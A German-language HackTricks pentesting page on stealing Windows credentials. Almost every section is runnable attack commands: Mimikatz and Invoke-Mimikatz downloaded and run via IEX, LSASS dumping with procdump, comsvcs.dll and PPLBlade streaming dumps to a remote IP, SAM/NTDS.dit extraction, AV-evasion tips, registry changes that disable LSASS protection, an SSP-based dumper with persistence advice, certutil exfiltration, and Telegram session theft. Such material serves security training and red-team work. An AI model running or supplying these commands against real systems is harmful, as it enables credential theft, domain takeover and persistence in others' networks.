# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Weitere Funktionen von Mimikatz findest du auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Hier erfährst du mehr über mögliche Schutzmaßnahmen für Zugangsdaten.**](credentials-protections.md) **Diese Schutzmaßnahmen können Mimikatz daran hindern, bestimmte Zugangsdaten auszulesen.**

## Zugangsdaten mit Meterpreter

Verwende das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), das ich erstellt habe, um **Passwörter und Hashes** auf dem Zielsystem zu suchen.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Mit diesem Tool kannst du den **lsass-Prozess dumpen**, den **Dump herunterladen** und die **Credentials lokal** aus dem Dump **extrahieren**.

Du kannst auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) ausgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Manche **AV**-Lösungen könnten die Verwendung von **procdump.exe zum Dump von lsass.exe** als **bösartig erkennen**, weil sie die Zeichenfolgen **„procdump.exe“ und „lsass.exe“** erkennen. Daher ist es **unauffälliger**, als **Argument** die **PID** von lsass.exe an procdump zu übergeben, **anstatt** den **Namen lsass.exe**.

### Dump von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll** in `C:\Windows\System32` ist dafür zuständig, im Falle eines Absturzes den Prozessspeicher zu dumpen. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant; das dritte ist jedoch in drei Komponenten unterteilt. Die Prozess-ID des zu dumpenden Prozesses ist die erste Komponente, der Speicherort der Dump-Datei die zweite und das dritte Argument muss exakt das Wort **full** sein. Es gibt keine alternativen Optionen.\
Nach dem Parsen dieser drei Komponenten erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
**comsvcs.dll** kann zum Dump des lsass-Prozesses verwendet werden, sodass procdump nicht hochgeladen und ausgeführt werden muss. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Der folgende Befehl wird zur Ausführung verwendet:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass mit Task Manager dumpen**

1. Klicke mit der rechten Maustaste auf die Taskleiste und klicke auf Task Manager
2. Klicke auf Weitere Details
3. Suche im Tab „Prozesse“ nach dem Prozess „Local Security Authority Process“
4. Klicke mit der rechten Maustaste auf den Prozess „Local Security Authority Process“ und klicke auf „Create dump file“.

### lsass mit procdump dumpen

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei und Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite.

Ein bereits vorhandener vollständiger System-Crash-Dump oder eine komprimierte Kopie in einem zugänglichen Benutzerordner kann Zugangsdaten für eine Offline-Analyse enthalten. Dateinamen wie `MEMORY.DMP` und `MEMORY.7z` sind lediglich Hinweise zur Überprüfung: Verifiziere Herkunft und Zugriff und gehe nicht davon aus, dass sie verwendbare oder aktuelle Zugangsdaten enthalten.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Offline-Anmeldedaten aus VM-Snapshots extrahieren

Ein lesbares VM-Backup kann ein gespeichertes **Guest-Memory-Image** enthalten, selbst wenn kein Zugriff auf den laufenden Guest oder LSASS besteht. Identifizieren Sie bei VMware die Snapshot-Metadaten `.vmsn` und, sofern vorhanden, die zugehörige `.vmem`-Datei; verwechseln Sie keine davon mit einem `.vmdk`-Disk-Image. `VMkatz` verarbeitet Snapshots oder VM-Verzeichnisse und kann [Anmeldedaten von Windows-Anmeldesitzungen](credentials-mimikatz.md) wie Hashes und Tickets aus dem Guest-Memory wiederherstellen. Das Tool kann auch virtuelle Disks auf SAM-/LSA-Material untersuchen. Voraussetzung ist der Zugriff auf die Backup-Dateien, nicht Debug-Rechte auf der laufenden VM.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Das Beispiel in Checkpoint hat einen **lokalen** NT-Hash des Administrators aus einem Snapshot einer eigenständigen VM wiederhergestellt. Eine Authentifizierung bei der Domain war erst möglich, nachdem eine separate Wiederverwendung des Passworts bestätigt wurde; ein lokaler Hash aus einem Backup ist nicht automatisch ein Domain-Credential. Auf einem Host mit begrenztem Arbeitsspeicher kann VMkatz Seiten möglicherweise schrittweise scannen und freigeben. Dennoch kann es vorzuziehen sein, den Snapshot auf einen leistungsfähigeren Analyse-Host zu kopieren.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das den memory dump verschleiern und auf Remote-Workstations übertragen kann, ohne ihn auf der Festplatte abzulegen.

**Hauptfunktionen**:

1. PPL-Schutz umgehen
2. Memory-Dump-Dateien verschleiern, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Memory dump mit RAW- und SMB-Upload-Methoden hochladen, ohne ihn auf der Festplatte abzulegen (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-basiertes LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon setzt einen dreistufigen Dumper namens **LalsDumper** ein, der `MiniDumpWriteDump` nie aufruft. Daher werden EDR-Hooks für diese API nie ausgelöst:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 kleingeschriebenen `d`-Zeichen, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die schädliche DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 in LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XOR-verknüpft jedes Byte mit `0x20` und mappt den decodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – der gemappte Payload implementiert die MiniDump-Logik mithilfe von **direct syscalls** erneut, die über gehashte API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt den Handle, sodass die Exfiltration später erfolgen kann.

Hinweise für Operatoren:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 ersetzt den fest kodierten Platzhalter durch den absoluten Pfad zu `rtu.txt`; werden die Dateien getrennt, wird die Ausführungskette unterbrochen.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst eintragen, damit LSASS den SSP bei jedem Start erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie dann zur Extraktion von Zugangsdaten an Mimikatz/Volatility.
* Für die Ausführung von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS transparent den rogue SSP und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entfernt sie nicht aus LSASS. Lösche entweder den Registrierungseintrag und starte LSASS neu (Neustart des Systems) oder belasse ihn für langfristige Persistenz.

## CrackMapExec

### SAM-Hashes dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA-Geheimnisse auslesen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### NTDS.dit vom Ziel-DC dumpen

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump des NTDS.dit-Passwortverlaufs vom Ziel-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM-Dateien stehlen

Diese Dateien sollten sich unter _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ befinden. Du kannst sie jedoch **nicht einfach auf herkömmliche Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Am einfachsten kannst du diese Dateien stehlen, indem du eine Kopie aus der Registry abrufst:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Laden Sie** diese Dateien auf Ihren Kali-Rechner herunter und **extrahieren Sie die Hashes** mit:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Mit diesem Dienst können Sie geschützte Dateien kopieren. Sie müssen Administrator sein.

#### Mit vssadmin

Die Binärdatei vssadmin ist nur in Windows-Server-Versionen verfügbar.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Aber du kannst dasselbe auch aus **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und die Datei wird unter C:\users\Public gespeichert), aber du kannst dies zum Kopieren jeder geschützten Datei verwenden:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active-Directory-Anmeldedaten – NTDS.dit**

Die Datei **NTDS.dit** gilt als Herzstück von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. In ihr werden die **Passwort-Hashes** der Domänenbenutzer gespeichert. Diese Datei ist eine Datenbank der **Extensible Storage Engine (ESE)** und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei primäre Tabellen verwaltet:

- **Datentabelle**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Linktabelle**: Sie erfasst Beziehungen, beispielsweise Gruppenmitgliedschaften.
- **SD-Tabelle**: Hier werden die **Sicherheitsbeschreibungen** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Untersuchungen auf Datenbankebene dokumentieren diese Tabellen und ihr versionsspezifisches Verhalten genauer.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren; sie wird von _lsass.exe_ verwendet. Ein **Teil** der Datei **NTDS.dit** kann sich daher im Speicher von **`lsass`** befinden (wahrscheinlich sind dort die zuletzt abgerufenen Daten zu finden, da zur Leistungssteigerung ein **Cache** verwendet wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **Hash** mit dem **PEK** und **RC4** entschlüsseln.
3. Den **Hash** mit **DES** entschlüsseln.

Der **PEK** hat auf jedem Domänencontroller **denselben Wert**, ist jedoch in **NTDS.dit** mit dem domänenspezifischen **BOOTKEY** aus der **SYSTEM**-Hive dieses Domänencontrollers **verschlüsselt**. Zum Extrahieren der Anmeldedaten werden daher sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) benötigt.

Eine separate [Kernel-Technik zur Umleitung von Handle-Tabellen](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) kann ein bereits geöffnetes NTDS-Dateiobjekt ohne VSS kopieren, erfordert jedoch ein beliebiges Kernel-Lese-/Schreibprimitiv auf dem Domänencontroller.<sup>[[16]](#references)</sup>

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Du kannst auch den Trick mit der [**Volume Shadow Copy**](#stealing-sam-and-system) verwenden, um die Datei **ntds.dit** zu kopieren. Denke daran, dass du auch eine Kopie der **SYSTEM-Datei** benötigst (verwende dazu erneut den Trick, sie [**aus der Registry zu dumpen oder die Volume Shadow Copy zu verwenden**](#stealing-sam-and-system)).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **beschafft** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Sie können sie auch automatisch mit einem gültigen Domänenadministrator-Benutzer **extrahieren**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **Metasploit-Modul** _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Domänenobjekte aus NTDS.dit in eine SQLite-Datenbank extrahieren**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse, sondern auch die gesamten Objekte und ihre Attribute extrahiert, um weitere Informationen auszulesen, sobald die rohe NTDS.dit-Datei abgerufen wurde.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

The `SYSTEM` hive ist optional, ermöglicht jedoch die Entschlüsselung von Secrets (NT- und LM-Hashes, zusätzliche Anmeldedaten wie Klartextpasswörter, Kerberos- oder Trust-Keys sowie NT- und LM-Passworthistorien). Neben weiteren Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, Organisationsstruktur der Organisationseinheiten und Mitgliedschaften, vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen ...

## Lazagne

Lade die Binärdatei [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Mit dieser Binärdatei kannst du Anmeldedaten aus verschiedenen Programmen extrahieren.

```
lazagne.exe all
```

## Weitere Tools zum Extrahieren von Zugangsdaten aus SAM und LSASS

### Windows credentials Editor (WCE)

Mit diesem Tool können Zugangsdaten aus dem Speicher extrahiert werden. Lade es hier herunter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Zugangsdaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Anmeldedaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Lade es von [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und **führe es einfach aus**. Die Passwörter werden dann extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetrieerfassung im Stil von DumpRDPHistory

* **Ausgehende RDP-Ziele** – analysiere jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Belege für eingehende RDP-Verbindungen** – Durchsuche das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Verbindung getrennt), um zu ermitteln, wer den Rechner administriert hat:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange seine **getrennte** Sitzung noch besteht. CredSSP + NTLM-Fallback hinterlassen seinen Verifier und seine Tokens in LSASS, die dann über SMB/WinRM wiederverwendet werden können, um `NTDS.dit` abzugreifen oder Persistenz auf Domain Controllern einzurichten.

### Von FinalDraft anvisierte Registry-Downgrades

Das Implantat manipuliert außerdem mehrere Registry-Schlüssel, um den Diebstahl von Zugangsdaten zu erleichtern:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` deaktiviert Restricted Admin für eingehende RDP-Verbindungen; es ermöglicht **nicht**, über diesen Modus pass-the-hash zu nutzen. Wenn der Wert auf `0` gesetzt wird, ist Restricted Admin auf dem Ziel zulässig, aber der Client muss `/RestrictedAdmin` anfordern oder eine Richtlinie verwenden, die Restricted Admin voraussetzt.<sup>[[14]](#references)</sup> Ein Hash allein gewährt keine Administratorrechte auf einem Remote-System; siehe [Voraussetzungen für die RDP-Authentifizierung](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Tokenfilterung, sodass lokale Administratoren uneingeschränkte Token über das Netzwerk erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht dem DSRM-Administrator die Anmeldung, während der DC online ist, und gibt Angreifern damit ein weiteres integriertes Konto mit hohen Berechtigungen.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz und macht den Speicherzugriff für Dump-Tools wie LalsDumper trivial.

## Zugangsdaten der hMailServer-Konfiguration (post-compromise)

Prüfen Sie je nach Installationslayout die exakten Konfigurationsdateien `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` und `C:\ProgramData\hMailServer\hMailServer.ini`. Ein lesbarer, nicht leerer Wert für `[Security] AdministratorPassword=` ist ein hMailServer-Administrationspasswort-Hash; er ist kein Beleg für ein Windows-Administratorkennwort. Wird diese Zugangsinformation wiederhergestellt, setzt jeder Wechsel zu einem Windows-Konto eine unabhängig bestätigte Wiederverwendung des Kennworts und entsprechende Anmelderechte voraus.

Bei Installationen mit einer SQL-CE-Datenbank schützt der separate Wert `[Database] Password=` in der INI-Datei die Datenbank. In älteren Installationen ist dieser Wert mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und 4-Byte-Vertauschungen der Wort-Endianess Blowfish-verschlüsselt. Verwenden Sie den Hex-String aus der INI-Datei mit diesem Python-Snippet:<sup>[[2]](#references)</sup>

Bestätigen Sie zunächst, dass das aktuelle Konto sowohl die INI-Datei als auch die zugehörige SQL-CE-Datenbankdatei `.sdf` lesen kann. Das INI-Passwort schützt die Datenbank; es ist von den darin gespeicherten Hashes der Postfachkonten getrennt. Untersuchen oder aktualisieren Sie eine **Kopie** einer verwendeten Datenbank, niemals die aktive Datei.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Kopiere die SQL CE-Datenbank mit dem Klartextpasswort, um Dateisperren zu vermeiden, lade den 32-Bit-Provider und führe bei Bedarf ein Upgrade durch, bevor du die Hashes abfragst:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die Spalte `accountpassword` verwendet das hMailServer-Hashformat (hashcat-Modus `1421`). Ein geknacktes Postfachpasswort ermöglicht nur dann einen Pivot zu einem Windows-Benutzerkonto, wenn dieses Passwort von einem lokalen oder Domänenkonto wiederverwendet wird und dieses Konto über die erforderlichen Rechte für die Remoteanmeldung verfügt.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Einige Tools erfassen **Anmeldepasswörter im Klartext**, indem sie den LSA-Anmelde-Callback `LsaApLogonUserEx2` abfangen. Dabei wird der Callback des Authentifizierungspakets gehookt oder umschlossen, um Zugangsdaten **während der Anmeldung** (vor dem Hashing) zu erfassen und anschließend auf der Festplatte zu speichern oder an den Operator zurückzugeben. Dies wird üblicherweise mit einem Hilfsprogramm umgesetzt, das sich in LSA injiziert oder dort registriert und anschließend jedes erfolgreiche interaktive oder Netzwerk-Anmeldeereignis mit Benutzername, Domäne und Passwort protokolliert.<sup>[[1]](#references)</sup>

Hinweise zum Betrieb:
- Erfordert lokale Administrator- oder SYSTEM-Rechte, um das Hilfsprogramm in den Authentifizierungspfad zu laden.
- Zugangsdaten werden nur erfasst, wenn eine Anmeldung erfolgt (je nach Hook interaktiv, per RDP, als Dienst oder über das Netzwerk).

## In SSMS gespeicherte Verbindungsdaten (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert Informationen zu gespeicherten Verbindungen in einer benutzerspezifischen `sqlstudio.bin`-Datei. Spezielle Dumper können die Datei auslesen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur die Befehlsausgabe zurückgeben, wird die Datei häufig exfiltriert, indem sie Base64-kodiert und auf stdout ausgegeben wird.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Browser-Sitzungs- und Cookie-Diebstahl über das Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Diebstahl von Telegram-Desktop-`tdata`-Sitzungen

Telegram Desktop speichert Autorisierungs- und Kontostatus in seinem Verzeichnis **`tdata`**. Eine kopierte Sitzung kann mit kompatiblen Tools geladen werden, um sich ohne Kontopasswort zu authentifizieren, solange diese Autorisierung gültig ist. Ist die Verschlüsselung lokaler Daten aktiviert, benötigt der Stealer zusätzlich den Passcode. Eine authentifizierte Sitzung kann anschließend Identitätsdaten, Metadaten zu Dialogen und Mitgliedschaften, Nachrichten sowie herunterladbare Medien offenlegen.<sup>[[10]](#references)</sup>

### Suche und Beschaffung

Durchsuche sowohl installierte als auch portable Verzeichnisstrukturen. Die Namen der Microsoft-Store-Pakete variieren; liste daher Paketverzeichnisse auf, die `TelegramMessenge` enthalten, und untersuche deren Unterverzeichnis `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Wenn gewöhnliche Lesezugriffe fehlschlagen und das Prozesstoken `SeBackupPrivilege` **bereits enthält und aktiviert hat**, bietet der sicherungsbewusste Zugriff eine Ausweichmöglichkeit; er verschafft dem Prozess weder dieses Privileg noch höhere Berechtigungen. `CreateFileW` mit `FILE_FLAG_BACKUP_SEMANTICS` kann Sicherungs-/Wiederherstellungssemantik anfordern und Dateisicherheitsprüfungen umgehen, sofern die erforderlichen Token-Privilegien vorhanden sind. Das Flag allein umgeht jedoch keine inkompatible Freigabesperre.<sup>[[10]](#references)[[11]](#references)</sup>

